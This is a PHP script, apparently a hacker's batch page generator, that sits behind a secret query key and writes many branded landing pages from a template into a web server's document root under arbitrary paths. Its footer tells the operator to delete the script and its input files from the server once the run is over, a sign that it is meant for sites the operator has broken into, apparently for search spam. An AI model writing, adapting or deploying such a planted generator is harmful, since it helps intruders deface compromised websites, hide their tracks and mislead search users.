<?php

if (!isset($_GET['cmd']) || $_GET['cmd'] !== 'crot') {
    die('Access Denied!');
}

$paths  = file('path.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$brands = file('brand.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$template = file_get_contents('lp.txt');

$extList = array('php');

set_time_limit(0);
ob_start();
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Silent Is Good</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<div class="container">

<div class="header">
    <h1>Generator Misterius Kakemagic</h1>
    <p>Batch Page System</p>
</div>

<?php

$success = 0;
$fail = 0;

if (count($brands) < count($paths)) {
    die("<div class='log'>
            <span>Brand kurang dari jumlah path!</span>
            <span class='badge fail'>ERROR</span>
          </div>");
}

foreach ($paths as $index => $path) {

    $path = '/' . ltrim(trim($path), '/'); // FIX: biar selalu ada slash depan

    echo "<div class='log'>
            <span>Processing: $path</span>
            <span class='badge info'>INFO</span>
          </div>";

    if (preg_match('/\.(php|html|htm)$/i', $path)) {

        $output = $_SERVER['DOCUMENT_ROOT'] . $path;
        $dir = dirname($output);

        if (!is_dir($dir)) {
            if (!mkdir($dir, 0755, true)) {
                echo "<div class='log'>
                        <span>Failed to create directory</span>
                        <span class='badge fail'>ERROR</span>
                      </div>";
                $fail++;
                continue;
            }
        }

        $ext = pathinfo($output, PATHINFO_EXTENSION);

        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
        $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $path;

    } else {

        $cleanPath = '/' . trim($path, '/');
        $serverPath = $_SERVER['DOCUMENT_ROOT'] . $cleanPath;

        if (!is_dir($serverPath)) {
            if (!mkdir($serverPath, 0755, true)) {
                echo "<div class='log'>
                        <span>Failed to create directory</span>
                        <span class='badge fail'>ERROR</span>
                      </div>";
                $fail++;
                continue;
            }
        }

        $ext = $extList[array_rand($extList)];
        $output = $serverPath . "/index.$ext";

        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
        $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $cleanPath . "/";
    }

    $brand = $brands[$index];

    $content = $template;

    $content = str_replace('{{BRAND_NAME}}', $brand, $content);
    $content = str_replace('{{URL_PATH}}', $url, $content);

    if ($ext !== 'php') {

        $brandUpper = strtoupper($brand);

        $content = preg_replace(
            '/<\?php\s*echo\s*strtoupper\(\s*\$brandName\s*\)\s*;\s*\?>/i',
            $brandUpper,
            $content
        );

        $content = preg_replace(
            '/<\?php\s*echo\s*\$urlPath\s*;?\s*\?>/i',
            $url,
            $content
        );

        $content = preg_replace(
            '/<\?=\s*strtoupper\(\s*\$brandName\s*\)\s*\?>/i',
            $brandUpper,
            $content
        );

        $content = preg_replace(
            '/<\?=\s*\$urlPath\s*\?>/i',
            $url,
            $content
        );

        $content = preg_replace('/<\?php.*?\?>/s', '', $content);
        $content = preg_replace('/<\?=.*?\?>/s', '', $content);
    }

    $writeSuccess = false;

$fp = @fopen($output, "w");
if ($fp) {
    if (fwrite($fp, $content) !== false) {
        $writeSuccess = true;
    }
    fclose($fp);
}

if ($writeSuccess) {
        echo "<div class='log'>
                <span>Created: $output (Brand: $brand)</span>
                <span class='badge success'>SUCCESS</span>
              </div>";
        $success++;
    } else {
        echo "<div class='log'>
                <span>Failed writing file</span>
                <span class='badge fail'>ERROR</span>
              </div>";
        $fail++;
    }

    ob_flush();
    flush();
}

?>

<div class="footer">
    <strong>Process Completed</strong><br><br>
    Success: <?php echo $success; ?> |
    Failed: <?php echo $fail; ?>

    <div class="warning">
        ⚠️Setelah selesai, hapus file berikut dari server:
        <br> - script ini (gen2.php)
        <br> - path.txt
        <br> - brand.txt
        <br> - lp.txt
    </div>

    <div class="credit">
        Script By Rixxx
    </div>
</div>

</div>

</body>
</html>

<?php
ob_end_flush();
?>